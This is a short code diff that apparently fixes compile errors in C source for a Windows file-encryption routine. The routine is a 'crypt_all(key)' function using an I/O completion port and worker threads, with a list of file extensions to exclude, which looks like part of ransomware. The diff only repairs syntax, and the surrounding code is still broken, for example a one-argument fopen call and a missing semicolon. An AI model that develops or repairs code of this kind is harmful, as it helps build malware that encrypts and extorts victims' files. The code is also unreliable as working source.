@@ -2,7 +2,7 @@
 #define SHOULD_OMIT 2048
 
 char *exclude[]={".pdf",".txt"};
-HANDLE CompletionPort
+HANDLE CompletionPort;
 int filesize(char *file)
 {
 FILE *filep = fopen(file);
@@ -58,7 +58,7 @@ fwrite
 void crypt_all(char *key)
 {
 DWORD threads;
-Handle thread;
+HANDLE thread;
   CompletionPort = CreateIoCompletionPort(INVALID_HANDLE_VALUE,0,0,threads)
     if(CompletionPort)
   {
